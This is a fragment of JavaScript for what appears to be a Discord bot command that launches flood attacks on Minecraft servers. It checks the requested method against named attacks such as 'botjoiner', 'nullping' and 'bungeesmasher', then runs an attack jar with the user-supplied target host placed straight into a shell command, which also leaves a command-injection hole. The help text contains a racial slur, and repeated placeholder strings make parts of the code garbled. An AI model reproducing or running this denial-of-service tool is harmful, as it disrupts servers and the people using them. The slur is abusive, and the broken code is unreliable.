...
const BannedWords = ["Balls", "103.74.120.226"]
...
if(!args[0]) {
	...
	.setColor('RANDOM')
	.setTitle('hh')
	.setDescription("` NiggaFLex is Skidder.attack 1.1.1.1 47 botjoiner`")
...
if(args[2] === "tcpkiller" || args[2] === "spigot" || args[2] === "bye" || args[2] === "killnet" || args[2] === "cpurip" || args[2] === "overload" || args[2] === "cpudowner" || args[2] === "joinmotd" || args[2] === "botjoiner" || args[2] === "nullping" || args[2] === "bungeesmasher" || args[2] === "nettydowner" || args[2] === "join" || args[2] === "joinkiller" || args[2] === "aegis" || args[2] === "nantibot" || args[2] === "handshake") {
		...
		if (BannedWords.some(word => message.toString().toLowerCase().includes(word))) {
			message.delete().catch(e => console.error("1233#4559."));
			message.reply(`1233#4559.`)
			return;
		} 
		...
		var exec = require('child_process').exec
			exec(`java -Dperdelay=5000 -Ddelay=1 -Drmnwp=false -jar 1233#45591233#45591233#45591233#45591233#45591233#45591233#4559.jar ${host} ${protocol} ${chetmemay} 60 -1`, (error, stdout, stderr) => {
		});
